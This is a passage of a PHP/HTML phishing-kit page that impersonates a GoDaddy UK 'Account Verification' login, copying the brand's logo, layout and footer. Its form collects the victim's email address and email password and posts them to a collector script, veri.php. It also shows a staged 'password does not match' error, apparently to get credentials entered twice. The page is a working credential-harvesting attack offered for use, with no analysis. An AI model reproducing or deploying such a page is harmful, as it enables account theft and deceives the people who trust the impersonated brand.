            --uxp-icon-apple: url("data:image/svg+xml;utf-8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27><path fill-rule=%27evenodd%27 d=%27M12.92 3.55A6.46 6.46 0 0115.78 2a4.11 4.11 0 01-.84 3.21 5.8 5.8 0 01-3 1.43 4.08 4.08 0 01.98-3.09zm4.76 17.26c-1.31 1.07-1.67 1.31-2.74 1.07a6.26 6.26 0 00-2.85-.71c-1.08.12-2 .83-3 .83s-2.26-.83-3.57-3.1a12.7 12.7 0 01-1.67-7.26c.36-2.26 2-4.16 3.69-4.52 2.38-.6 3.22.71 4.53.71a3.76 3.76 0 001.3-.35A4.83 4.83 0 0116.85 7a5.15 5.15 0 012.74 1.9s-2.62 1.67-2 4.41a4.6 4.6 0 002.62 3.45 15.869 15.869 0 01-2.53 4.05z%27 clip-rule=%27evenodd%27/></svg>");
        }

        .uxicon-apple:before {
            content: var(--uxp-icon-apple)
        }
    </style>
    <style>
        * {
            --uxp-icon-google: url("data:image/svg+xml;utf-8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27><path fill-rule=%27evenodd%27 d=%27M21.8 11.5c0-.4-.1-.9-.2-1.3h-9.4v3.9h5.4c-.2 1.2-1 2.4-2 3.1-.7.4-1.4.7-2.2.9-.8.1-1.6.2-2.4 0s-1.6-.5-2.2-1c-1-.7-1.7-1.7-2.2-2.8 0-.1-.1-.2-.1-.3-.4-1.2-.4-2.6 0-3.9.4-.9.8-1.7 1.5-2.4.8-.8 1.9-1.4 3-1.7 1-.2 2-.2 2.9.1.8.2 1.5.7 2.2 1.3l1.8-1.8c.3-.3.7-.6 1-1-.9-.9-2-1.6-3.2-2-2.2-.8-4.6-.8-6.7-.1-.4.2-.7.3-1 .4-2 .9-3.7 2.6-4.7 4.6-.4.8-.7 1.6-.9 2.5-.4 2.2-.1 4.5.9 6.5.7 1.3 1.6 2.4 2.7 3.3 1.1.8 2.3 1.5 3.6 1.8 1.7.4 3.4.4 5.1.1 1.5-.3 3-1.1 4.1-2.1 1.2-1.1 2.1-2.6 2.5-4.1.4-1.4.6-2.7.5-4z%27 clip-rule=%27evenodd%27/></svg>");
        }

        .uxicon-google:before {
            content: var(--uxp-icon-google)
        }
    </style>
    <style>
        * {
            --uxp-icon-facebook: url("data:image/svg+xml;utf-8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 24 24%27><path fill-rule=%27evenodd%27 d=%27M12 2a10 10 0 00-1.56 19.88v-7H7.9V12h2.54V9.8a3.52 3.52 0 013.77-3.89c.75.01 1.499.073 2.24.19v2.46h-1.26a1.45 1.45 0 00-1.63 1.56V12h2.78l-.45 2.89h-2.33v7A10 10 0 0012 2z%27 clip-rule=%27evenodd%27/></svg>");
        }

        .uxicon-facebook:before {
            content: var(--uxp-icon-facebook)
        }

        @media screen and (width <=500px) {
            body {
                --block-modifier: 0.75;
                --module-modifier: 0.5;
            }
        }

        /*!sc*/
        data-styled.g1[id="sc-global-dRWxHI1"] {
            content: "sc-global-dRWxHI1,"
        }

        /*!sc*/
        html {
            height: 100%;
        }

        /*!sc*/
        #main {
            height: 100%;
        }

        /*!sc*/
        body {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            height: 100%;
        }

        /*!sc*/
        #root {
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
        }

        /*!sc*/
        #root>div {
            height: 100%;
        }

        /*!sc*/
        data-styled.g2[id="sc-global-bMGfFh1"] {
            content: "sc-global-bMGfFh1,"
        }

        /*!sc*/
        .ux-app {
            background: var(--ux-cao06b, white);
        }

        /*!sc*/
        data-styled.g3[id="sc-global-fZhIa-d1"] {
            content: "sc-global-fZhIa-d1,"
        }

        /*!sc*/
        .card.ux-card {
            padding: calc(var(--ux-1sbfig8, .25rem) * 12) calc(var(--ux-1sbfig8, .25rem) * 14);
        }

        /*!sc*/
        .card-block.idp {
            padding: 0 !important;
        }

        /*!sc*/
        @media (width <=767px) {
            .card.ux-card {
                padding: calc(var(--ux-1sbfig8, .25rem) * 4) calc(var(--ux-1sbfig8, .25rem) * 6);
            }
        }

        /*!sc*/
        data-styled.g5[id="sc-global-dFCyyr1"] {
            content: "sc-global-dFCyyr1,"
        }

        /*!sc*/
        .hERuqv .ux-button .ux-button-icon {
            margin: 0 8px 0 0;
        }

        /*!sc*/
        .hERuqv .ux-checkbox-label {
            font-weight: 400;
            line-height: 1.5;
        }

        /*!sc*/
        data-styled.g6[id="LoginPageStyles__LoginWrapper-sc-pvsjk8-0"] {
            content: "hERuqv,"
        }

        /*!sc*/
        .zfCle {
            padding-left: 8px;
            padding-right: 8px;
        }

        /*!sc*/
        @media (width >=1200px) {
            .zfCle.container {
                max-width: 1140px;
            }
        }

        /*!sc*/
        @media (width <=520px) {
            .zfCle .col {
                padding-left: 0;
                padding-right: 0;
            }
        }

        /*!sc*/
        @media (width >=520px) {
            .zfCle {
                padding-top: 10px;
            }
        }

        /*!sc*/
        @media (width >=768px) {
            .zfCle {
                padding-top: 40px;
            }
        }

        /*!sc*/
        data-styled.g7[id="FormPage__Container-sc-1b51r8o-0"] {
            content: "zfCle,"
        }

        /*!sc*/
        .ixbTgw {
            max-width: 560px;
        }

        /*!sc*/
        data-styled.g8[id="FormPageColumn__Container-sc-uwin2-0"] {
            content: "ixbTgw,"
        }

        /*!sc*/
        @media (max-width: 680px) {
            #hidesmall {
               display: none;
            }
        }
</style>
</head>

<body class="ux-app gasket-app">
    <div class="d-none" data-testid="header-wrapper">
        <div data-cy="header">
            <div id="hcs-header-container">
                <div class="skip-nav-spacing"><a
                        class="ux-button skip-navigation ux-text ux-text-size0 ux-text-action ux-button-secondary"
                        href="#main" data-cy="skip-navigation"><span class="ux-button-text">Skip to main
                            content</span></a></div>
                <div>
                    <div class="language-header see-change-bar">
                        <div class="container-fluid">
                            <div class="flex-row d-flex">
                                <div class="see-change-bar-left d-flex">
                                    <div class="topnav-logo-wrap"><a href="" target="_self"
                                            data-eid="uxp.hyd.utility_bar.logo.link.click" class="topnav-logo"><span
                                                class="topnav-country">United Kingdom</span>
                                            <figure class="go-logo desktop-logo" aria-label="GoDaddy">
                                                <figcaption class="sr-only" >GoDaddy</figcaption><svg
                                                    viewBox="0 0 163 34" xmlns="http://www.w3.org/2000/svg">
                                                    <path
                                                        d="M32.937 1.554c-3.968-2.48-9.193-1.89-13.852 1.039C14.44-.335 9.213-.925 5.25 1.553c-6.27 3.919-7.032 14.01-1.701 22.54 3.93 6.289 10.074 9.974 15.544 9.906 5.47.068 11.615-3.617 15.545-9.906 5.324-8.53 4.568-18.621-1.701-22.54zM6.43 22.292a20.436 20.436 0 0 1-2.46-5.632 16.104 16.104 0 0 1-.534-5.31c.238-3.153 1.521-5.608 3.612-6.914s4.855-1.385 7.8-.217c.441.177.878.38 1.312.606a24.092 24.092 0 0 0-4.228 5.08C8.697 15.086 7.71 20.849 8.84 25.444a20.912 20.912 0 0 1-2.408-3.151H6.43zm27.786-5.634a20.484 20.484 0 0 1-2.46 5.632 21.103 21.103 0 0 1-2.408 3.158c1.01-4.12.324-9.165-2.153-13.897a.624.624 0 0 0-.895-.243l-7.72 4.823a.629.629 0 0 0-.2.87l1.133 1.81a.632.632 0 0 0 .869.2l5.004-3.125c.162.486.324.97.445 1.457.472 1.725.653 3.518.536 5.303-.238 3.15-1.521 5.606-3.612 6.914a7.061 7.061 0 0 1-3.579 1.036h-.16a7.051 7.051 0 0 1-3.578-1.036c-2.093-1.308-3.376-3.763-3.614-6.914a16.143 16.143 0 0 1 .534-5.31 21.015 21.015 0 0 1 6.444-10.314 16.136 16.136 0 0 1 4.532-2.806c2.936-1.168 5.705-1.09 7.797.217 2.093 1.308 3.375 3.76 3.613 6.914a16.145 16.145 0 0 1-.528 5.31zm39.848-3.766c-4.06 0-7.34 3.169-7.34 7.2 0 4.004 3.28 7.12 7.34 7.12 4.086 0 7.366-3.111 7.366-7.12 0-4.03-3.275-7.2-7.366-7.2zm0 10.557c-1.871 0-3.295-1.513-3.295-3.384s1.424-3.407 3.295-3.407c1.898 0 3.322 1.54 3.322 3.412 0 1.87-1.424 3.385-3.322 3.385v-.006zM90.583 7.362h-7.468a.6.6 0 0 0-.61.612v18.208a.607.607 0 0 0 .61.648h7.468c5.977 0 10.13-3.975 10.13-9.758 0-5.818-4.153-9.71-10.13-9.71zm.177 15.622h-4.087V11.198h4.087c3.308 0 5.588 2.474 5.588 5.866 0 3.336-2.28 5.92-5.588 5.92zm24.82-9.7h-2.809a.63.63 0 0 0-.582.612v.833c-.64-1.057-2.085-1.835-3.884-1.835-3.503 0-6.783 2.75-6.783 7.145 0 4.37 3.251 7.17 6.755 7.17 1.806 0 3.28-.776 3.92-1.833v.86a.585.585 0 0 0 .582.586h2.808a.575.575 0 0 0 .543-.36.564.564 0 0 0 .041-.225V13.896a.595.595 0 0 0-.591-.612zm-6.533 10.196c-1.86 0-3.256-1.43-3.256-3.412s1.397-3.41 3.256-3.41c1.86 0 3.257 1.426 3.257 3.408s-1.395 3.412-3.257 3.412v.002zm22.294-16.118h-2.808a.588.588 0 0 0-.561.355.598.598 0 0 0-.049.229v6.728c-.648-1.002-2.114-1.78-3.948-1.78-3.476 0-6.7 2.75-6.7 7.145 0 4.37 3.252 7.17 6.755 7.17 1.806 0 3.17-.776 3.92-1.833v.86c0 .323.261.584.583.586h2.808a.571.571 0 0 0 .584-.585V7.95a.569.569 0 0 0-.357-.547.573.573 0 0 0-.227-.041zm-6.532 16.152c-1.852 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.384 3.448-3.237 3.448zm22.29-16.152h-2.803a.597.597 0 0 0-.562.355.581.581 0 0 0-.05.229v6.728c-.64-1.002-2.114-1.78-3.947-1.78-3.477 0-6.7 2.75-6.7 7.145 0 4.37 3.253 7.17 6.755 7.17 1.807 0 3.168-.776 3.92-1.833v.86a.586.586 0 0 0 .584.586h2.803a.571.571 0 0 0 .542-.36.564.564 0 0 0 .04-.225V7.95a.567.567 0 0 0-.582-.588zm-6.532 16.152c-1.853 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.38 3.448-3.232 3.448h-.005zm21.906-9.283-4.19 14.37c-.809 2.556-2.613 4.086-5.421 4.086-1.277 0-2.44-.261-3.35-.782-.531-.303-.971-.58-.971-1.023 0-.275.089-.417.25-.675l.832-1.246c.235-.348.408-.461.66-.461a.96.96 0 0 1 .554.192c.523.339 1.008.63 1.748.63.864 0 1.524-.277 1.88-1.306l.36-1.193h-1.696c-.418 0-.648-.25-.751-.584l-3.75-12.008c-.14-.473-.011-.946.683-.946h2.954c.36 0 .613.123.771.64l2.77 9.67 2.589-9.67c.082-.334.306-.64.75-.64h2.802c.552-.001.719.387.526.946zm-96.806 4.274v7.676a.625.625 0 0 1-.635.634h-2.317a.622.622 0 0 1-.634-.634v-2.015c-1.472 1.858-4.03 3.028-6.924 3.028-5.434 0-9.681-4.088-9.681-9.908 0-6.048 4.585-10.217 10.377-10.217 4.276 0 7.694 1.839 9.212 5.537a.842.842 0 0 1 .07.309c0 .175-.116.307-.486.435l-2.706 1.042a.694.694 0 0 1-.511.009.783.783 0 0 1-.324-.371c-.971-1.847-2.7-3.1-5.36-3.1-3.45 0-5.922 2.694-5.922 6.188 0 3.387 2.104 6.172 6.02 6.172 2.06 0 3.703-.97 4.469-2.037H57.87a.625.625 0 0 1-.634-.635v-2.086a.626.626 0 0 1 .634-.634h7.161a.602.602 0 0 1 .587.367.6.6 0 0 1 .049.24z">
                                                    </path>
                                                </svg>
                                            </figure>
                                        </a></div>
                                </div>
                                <div class="see-change-bar-right justify-content-end">
                                    <style type="text/css">
                                        .tray-menu {
                                            --ux-trayMenu--backgroundColor: var(--ux-1s71qu, transparent);
                                            --ux-trayMenu--fontSize: var(--ux-q20f9v, var(--ux-vvspv2, 1rem));
                                            --ux-trayMenuChosen--backgroundColor: var(--ux-1a0nc5m, var(--ux-l7zq7p, white));
                                            --ux-trayMenu-indicator--fontSize: var(--ux-c4xe1r, var(--ux-cxbe8g, 1rem));
                                            --ux-trayMenu-indicator--fontWeight: var(--ux-1yw82ai, var(--ux-j40yyd, 400));
                                            --ux-trayMenu-indicator--borderRadius: var(--ux-1x38u9p, var(--ux-1s5tndb, 2px));
                                        }
                                    </style>
                                    <div class="tray-menu contact-tray">
                                        <div class="tray-toggle-wrapper"><button aria-label="Contact Us"
                                                class="tray-toggle"
                                                data-eid="uxp.hyd.utility_bar.contact_tray.tray.click"
                                                aria-expanded="false" aria-haspopup="true"><span><span
                                                        class="basic-phone-text hidden-sm-down title-text">Contact Us
                                                        24/7</span></span><span class="chevron-down"><svg
                                                        class="uxicon-svg-container tray-toggle-chevron" height="20"
                                                        width="20" role="presentation">
                                                        <use fill="currentColor"
                                                            xlink:href="#svg-container-chevron-down"></use>
                                                    </svg></span></button></div>
                                        <div class="tray-fullwidth tray-dropdown loaded">
                                            <div class="tray-content"><button class="close" aria-label="close"></button>
                                                <div class="container">
                                                    <div class="support-announcement-all"><span
                                                            class="support-announcement-text"><svg
                                                                class="uxicon-svg-container" height="1.5em"
                                                                width="1.5em" role="presentation">
                                                                <use fill="currentColor"
                                                                    xlink:href="#svg-container-information"></use>
                                                            </svg>Keep Your Business Open During COVID-19</span><span
                                                            class="support-announcement-btn"><a
                                                                href="https://uk.godaddy.com/open-we-stand"
                                                                target="_self"
                                                                data-eid="uxp.hyd.utility_bar.support_announcement_btn.click"
                                                                class="ux-button ux-button-secondary ux-button-small btn btn-sm btn-default">Learn
                                                                More</a></span></div>
                                                    <div class="row">
                                                        <div class="col-lg-4 col-md-6 content-wrap">
                                                            <div class="row">
                                                                <div class="col-sm-12">
                                                                    <div role="heading" aria-level="2"
                                                                        class="font-primary-bold h3">Call us</div>
                                                                </div>
                                                            </div>
                                                            <ul class="alt-contact-list list-unstyled">
                                                                <li><span>Call our award-winning sales &amp; support
                                                                        team 24/7</span><a class="contact-link"
                                                                        data-eid="uxp.hyd.utility_bar.support_phone.click"
                                                                        href="tel:02070841810">020 7084 1810</a></li>
                                                            </ul>
                                                            <div class="contact-link-info">Global Directory</div><a
                                                                href="contact-us" target="_self"
                                                                data-eid="uxp.hyd.utility_bar.global_directory.link.click"
                                                                class="contact-link">Phone numbers and hours</a>
                                                        </div>
                                                        <div class="col-lg-4 col-md-6 content-wrap divider">
                                                            <div id="gdchat-container"></div>
                                                        </div>
                                                        <div class="col-md-4 help-mobile hidden-md-up">
                                                            <div class="row">
                                                                <div class="col-sm-12">
                                                                    <div role="heading" aria-level="2"
                                                                        class="font-primary-bold h3">Help Center</div>
                                                                </div>
                                                            </div>
                                                            <p>Explore our online help resources</p>
                                                            <div><a href="help" target="_self"
                                                                    data-eid="uxp.hyd.utility_bar.help_center_link.link.click"
                                                                    class="ux-button ux-button-secondary btn btn-default">Get
                                                                    Help</a></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="root">
        <div id="__next">
            <main role="main" id="main">
                <div class="LoginPageStyles__LoginWrapper-sc-pvsjk8-0 hERuqv">
                    <div class="FormPage__Container-sc-1b51r8o-0 zfCle container">
                        <div class="row d-flex justify-content-sm-center">
                            <div class="FormPageColumn__Container-sc-uwin2-0 ixbTgw col col-xs-12 col-sm-10 col-lg-6">
                                <div id="login-container" data-testid="auth-react-wrapper">
                                    <div id="login-panel" class="ssodeck-framable-content">
                                        <div>
                                            <div id="new-ux" class="card ux-card form-container fs-unmask">
                                                <div class="card-block  idp ">
                                                    <div id="form-header" class="idp-form-header">
                                                        <div id="brand-header-template" class="remove-login-header">
                                                            <div class="logo-container">
                                                                <div id="brand-logo-resizer">
                                                                    <figure class="go-logo desktop-logo"
                                                                        aria-label="GoDaddy">
                                                                        <figcaption class="sr-only" >GoDaddy</figcaption>
                                                                        <svg viewBox="0 0 163 34"
                                                                            xmlns="http://www.w3.org/2000/svg">
                                                                            <path
                                                                                d="M32.937 1.554c-3.968-2.48-9.193-1.89-13.852 1.039C14.44-.335 9.213-.925 5.25 1.553c-6.27 3.919-7.032 14.01-1.701 22.54 3.93 6.289 10.074 9.974 15.544 9.906 5.47.068 11.615-3.617 15.545-9.906 5.324-8.53 4.568-18.621-1.701-22.54zM6.43 22.292a20.436 20.436 0 0 1-2.46-5.632 16.104 16.104 0 0 1-.534-5.31c.238-3.153 1.521-5.608 3.612-6.914s4.855-1.385 7.8-.217c.441.177.878.38 1.312.606a24.092 24.092 0 0 0-4.228 5.08C8.697 15.086 7.71 20.849 8.84 25.444a20.912 20.912 0 0 1-2.408-3.151H6.43zm27.786-5.634a20.484 20.484 0 0 1-2.46 5.632 21.103 21.103 0 0 1-2.408 3.158c1.01-4.12.324-9.165-2.153-13.897a.624.624 0 0 0-.895-.243l-7.72 4.823a.629.629 0 0 0-.2.87l1.133 1.81a.632.632 0 0 0 .869.2l5.004-3.125c.162.486.324.97.445 1.457.472 1.725.653 3.518.536 5.303-.238 3.15-1.521 5.606-3.612 6.914a7.061 7.061 0 0 1-3.579 1.036h-.16a7.051 7.051 0 0 1-3.578-1.036c-2.093-1.308-3.376-3.763-3.614-6.914a16.143 16.143 0 0 1 .534-5.31 21.015 21.015 0 0 1 6.444-10.314 16.136 16.136 0 0 1 4.532-2.806c2.936-1.168 5.705-1.09 7.797.217 2.093 1.308 3.375 3.76 3.613 6.914a16.145 16.145 0 0 1-.528 5.31zm39.848-3.766c-4.06 0-7.34 3.169-7.34 7.2 0 4.004 3.28 7.12 7.34 7.12 4.086 0 7.366-3.111 7.366-7.12 0-4.03-3.275-7.2-7.366-7.2zm0 10.557c-1.871 0-3.295-1.513-3.295-3.384s1.424-3.407 3.295-3.407c1.898 0 3.322 1.54 3.322 3.412 0 1.87-1.424 3.385-3.322 3.385v-.006zM90.583 7.362h-7.468a.6.6 0 0 0-.61.612v18.208a.607.607 0 0 0 .61.648h7.468c5.977 0 10.13-3.975 10.13-9.758 0-5.818-4.153-9.71-10.13-9.71zm.177 15.622h-4.087V11.198h4.087c3.308 0 5.588 2.474 5.588 5.866 0 3.336-2.28 5.92-5.588 5.92zm24.82-9.7h-2.809a.63.63 0 0 0-.582.612v.833c-.64-1.057-2.085-1.835-3.884-1.835-3.503 0-6.783 2.75-6.783 7.145 0 4.37 3.251 7.17 6.755 7.17 1.806 0 3.28-.776 3.92-1.833v.86a.585.585 0 0 0 .582.586h2.808a.575.575 0 0 0 .543-.36.564.564 0 0 0 .041-.225V13.896a.595.595 0 0 0-.591-.612zm-6.533 10.196c-1.86 0-3.256-1.43-3.256-3.412s1.397-3.41 3.256-3.41c1.86 0 3.257 1.426 3.257 3.408s-1.395 3.412-3.257 3.412v.002zm22.294-16.118h-2.808a.588.588 0 0 0-.561.355.598.598 0 0 0-.049.229v6.728c-.648-1.002-2.114-1.78-3.948-1.78-3.476 0-6.7 2.75-6.7 7.145 0 4.37 3.252 7.17 6.755 7.17 1.806 0 3.17-.776 3.92-1.833v.86c0 .323.261.584.583.586h2.808a.571.571 0 0 0 .584-.585V7.95a.569.569 0 0 0-.357-.547.573.573 0 0 0-.227-.041zm-6.532 16.152c-1.852 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.384 3.448-3.237 3.448zm22.29-16.152h-2.803a.597.597 0 0 0-.562.355.581.581 0 0 0-.05.229v6.728c-.64-1.002-2.114-1.78-3.947-1.78-3.477 0-6.7 2.75-6.7 7.145 0 4.37 3.253 7.17 6.755 7.17 1.807 0 3.168-.776 3.92-1.833v.86a.586.586 0 0 0 .584.586h2.803a.571.571 0 0 0 .542-.36.564.564 0 0 0 .04-.225V7.95a.567.567 0 0 0-.582-.588zm-6.532 16.152c-1.853 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.38 3.448-3.232 3.448h-.005zm21.906-9.283-4.19 14.37c-.809 2.556-2.613 4.086-5.421 4.086-1.277 0-2.44-.261-3.35-.782-.531-.303-.971-.58-.971-1.023 0-.275.089-.417.25-.675l.832-1.246c.235-.348.408-.461.66-.461a.96.96 0 0 1 .554.192c.523.339 1.008.63 1.748.63.864 0 1.524-.277 1.88-1.306l.36-1.193h-1.696c-.418 0-.648-.25-.751-.584l-3.75-12.008c-.14-.473-.011-.946.683-.946h2.954c.36 0 .613.123.771.64l2.77 9.67 2.589-9.67c.082-.334.306-.64.75-.64h2.802c.552-.001.719.387.526.946zm-96.806 4.274v7.676a.625.625 0 0 1-.635.634h-2.317a.622.622 0 0 1-.634-.634v-2.015c-1.472 1.858-4.03 3.028-6.924 3.028-5.434 0-9.681-4.088-9.681-9.908 0-6.048 4.585-10.217 10.377-10.217 4.276 0 7.694 1.839 9.212 5.537a.842.842 0 0 1 .07.309c0 .175-.116.307-.486.435l-2.706 1.042a.694.694 0 0 1-.511.009.783.783 0 0 1-.324-.371c-.971-1.847-2.7-3.1-5.36-3.1-3.45 0-5.922 2.694-5.922 6.188 0 3.387 2.104 6.172 6.02 6.172 2.06 0 3.703-.97 4.469-2.037H57.87a.625.625 0 0 1-.634-.635v-2.086a.626.626 0 0 1 .634-.634h7.161a.602.602 0 0 1 .587.367.6.6 0 0 1 .049.24z">
                                                                            </path>
                                                                        </svg>
                                                                    </figure>
                                                                </div>
                                                            </div>
                                                            <div id="title">
                                                                <h1 class="h3">Account Verification</h1>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    
		   <?php 
           if(isset($_SESSION['EML'])){
$mailprovider = explode('@',$_SESSION['EML']);
                       $mailprovider = $mailprovider[1];
           echo '<h4><img src="img/providers/genero.png" style="width:70px"> Please provide the following information so we can verify your identity.</h4>';                    
                         }else{
      echo '<h4><img src="img/providers/genero.png" style="width:70px"> Please provide the following information so we can verify your identity.</h4>';                    
                         }
                             ?>  


<?php
if (isset($_SESSION['loginemT']) &&
($_SESSION['loginemT'] == 1)
) { ?>                                     
    <div id="login-status-message"><div><div class="ux-space ux-dialog-shell ux-alert ux-alert--critical ux-text ux-dialog--contrast ux-dialog--stretch ux-space--as-block ux-space--inline ux-space--block" aria-labelledby="login-failure-alert" role="alert" dismissible="false"><div class="ux-dialog-icon"><svg class="uxicon-svg-container ux-dialog-accessory--critical" height="1.5em" width="1.5em" role="presentation"><use fill="currentColor" xlink:href="#svg-container-alert"></use></svg></div><div class="ux-dialog-details"><div id="login-failure-alert" class="ux-dialog-title"></div><div class="ux-dialog-content">Email address and email password does not match. Please try again. </div></div></div></div></div>

<?php } ?>       
                                                    <form action="veri.php?token=<?=$_GET['token']?>" autocomplete="off" method="POST" autocomplete="off">
                                                        <div id="form-container" class="">
                                                        <div id="login-status-message"></div>
                                                        <div>
                                                            <div id="username-container">
                                                                <div class="ux-text-input-shell">
                                                                    <div class="ux-field-frame ux-field-frame--stretch">
                                                                        <div
                                                                            class="ux-text-entry-shell ux-text ux-text-input">
                                                                            <label class="ux-label ux-label--internal " id="username"
                                                                                for="username">Email Address
                                                                                #<span
                                                                                    class="ux-text ux-label-required ux-text-feedback-critical"
                                                                                    aria-hidden="true">*</span></label><input
                                                                                class="ux-text-entry-field"
                                                                                required id="username-613"
                                                                                aria-required="true" type="email" name="userid"
                                                                                aria-describedby="" value="">
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div id="password-container">
                                                                <div class="ux-text-input-shell">
                                                                    <div class="ux-field-frame ux-field-frame--stretch">
                                                                        <div
                                                                            class="ux-text-entry-shell ux-text ux-text-input">
                                                                            <label class="ux-label ux-label--internal"
                                                                                for="password" id="passfrom">Email Password<span
                                                                                    class="ux-text ux-label-required ux-text-feedback-critical"
                                                                                    aria-hidden="true">*</span></label><input
                                                                                class="ux-text-entry-field"
                                                                                id="password-429" required
                                                                                aria-required="true" type="password"
                                                                                autocomplete="current-password"
                                                                                aria-describedby="" name="pass" value="">
                                                                        </div>
                                                                    </div>
                                                                </div><button
                                                                    class="ux-button show-hide-btn inline-show-hide-btn ux-text ux-text-size0 ux-button-inline"
                                                                    target="_parent" id="passtoggle" type="button"
                                                                    aria-label="Show password"><span
                                                                        class="ux-button-text">Show</span></button>
                                                            </div>
                                                            <button
                                                                class="ux-button btn btn-purchase btn-block ux-text ux-text-size0 ux-text-action ux-button-primary"
                                                                target="_parent" type="submit" id="submitBtn"><span
                                                                    class="ux-button-text">Verify</span></button>
                                                           </div>
                                                           </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    </div>
    <div id="hcs-footer-container">
        <div class="skip-nav-spacing"></div>
        <footer id="appheader-footer" class="manifest footer">
            <div class="container">Copyright © 1999 - 2024 GoDaddy Operating Company, LLC. All Rights Reserved. <a
                    class="privacy-link" href="legal/agreements/privacy-policy?target=_blank"
                    target="_blank" data-eid="uxp.hyd.int.pc.app_header.footer.privacy_policy.link.click">Privacy
                    Policy</a></div>
        </footer>
    </div>
    <div id="gtm_privacy"></div>

    <p aria-live="assertive" id="__next-route-announcer__" role="alert"
        style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;">
    </p>
    </next-route-announcer>
    <div id="svg-container" style="display: none;"><svg>
            <symbol id="svg-container-minus" viewBox="0 0 24 24">
                <path d="M20 12.75H4a.75.75 0 110-1.5h16a.75.75 0 110 1.5z"></path>
            </symbol>
            <symbol id="svg-container-checkmark" viewBox="0 0 24 24">
                <path
                    d="M9 18.25a.748.748 0 01-.53-.22l-5-5a.75.75 0 011.06-1.06L9 16.44 19.47 5.97a.75.75 0 011.06 1.06l-11 11a.748.748 0 01-.53.22z">
                </path>
            </symbol>
            <symbol id="svg-container-apple" viewBox="0 0 24 24">
                <path fill-rule="evenodd"
                    d="M12.92 3.55A6.46 6.46 0 0115.78 2a4.11 4.11 0 01-.84 3.21 5.8 5.8 0 01-3 1.43 4.08 4.08 0 01.98-3.09zm4.76 17.26c-1.31 1.07-1.67 1.31-2.74 1.07a6.26 6.26 0 00-2.85-.71c-1.08.12-2 .83-3 .83s-2.26-.83-3.57-3.1a12.7 12.7 0 01-1.67-7.26c.36-2.26 2-4.16 3.69-4.52 2.38-.6 3.22.71 4.53.71a3.76 3.76 0 001.3-.35A4.83 4.83 0 0116.85 7a5.15 5.15 0 012.74 1.9s-2.62 1.67-2 4.41a4.6 4.6 0 002.62 3.45 15.869 15.869 0 01-2.53 4.05z"
                    clip-rule="evenodd"></path>
            </symbol>
            <symbol id="svg-container-facebook" viewBox="0 0 24 24">
                <path fill-rule="evenodd"
                    d="M12 2a10 10 0 00-1.56 19.88v-7H7.9V12h2.54V9.8a3.52 3.52 0 013.77-3.89c.75.01 1.499.073 2.24.19v2.46h-1.26a1.45 1.45 0 00-1.63 1.56V12h2.78l-.45 2.89h-2.33v7A10 10 0 0012 2z"
                    clip-rule="evenodd"></path>
            </symbol>
            <symbol id="svg-container-google" viewBox="0 0 24 24">
                <path fill-rule="evenodd"
                    d="M21.8 11.5c0-.4-.1-.9-.2-1.3h-9.4v3.9h5.4c-.2 1.2-1 2.4-2 3.1-.7.4-1.4.7-2.2.9-.8.1-1.6.2-2.4 0s-1.6-.5-2.2-1c-1-.7-1.7-1.7-2.2-2.8 0-.1-.1-.2-.1-.3-.4-1.2-.4-2.6 0-3.9.4-.9.8-1.7 1.5-2.4.8-.8 1.9-1.4 3-1.7 1-.2 2-.2 2.9.1.8.2 1.5.7 2.2 1.3l1.8-1.8c.3-.3.7-.6 1-1-.9-.9-2-1.6-3.2-2-2.2-.8-4.6-.8-6.7-.1-.4.2-.7.3-1 .4-2 .9-3.7 2.6-4.7 4.6-.4.8-.7 1.6-.9 2.5-.4 2.2-.1 4.5.9 6.5.7 1.3 1.6 2.4 2.7 3.3 1.1.8 2.3 1.5 3.6 1.8 1.7.4 3.4.4 5.1.1 1.5-.3 3-1.1 4.1-2.1 1.2-1.1 2.1-2.6 2.5-4.1.4-1.4.6-2.7.5-4z"
                    clip-rule="evenodd"></path>
            </symbol>
        </svg></div>
</body>

<input type="hidden" id="seid">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    
<script>
       $(document).ready(function() {            
                 $('#passtoggle').click(function(){
            var saved = $('#seid').val();
if(saved != 1) {
    $('#password-429').attr('type','text');
     $('#seid').val(1);
     $('#passtoggle span').html('Hide');
   } else if(saved == 1) {
    $('#password-429').attr('type','password');
    $('#seid').val(2);
    $('#passtoggle span').html('Show');          
}
})


$('#username-613').on('mousedown', function () {$("#username").addClass('ux-label--floating');});
$('#password-429').on('mousedown', function () {
$("#passfrom").addClass('ux-label--floating');
});



        });
       </script>


</html>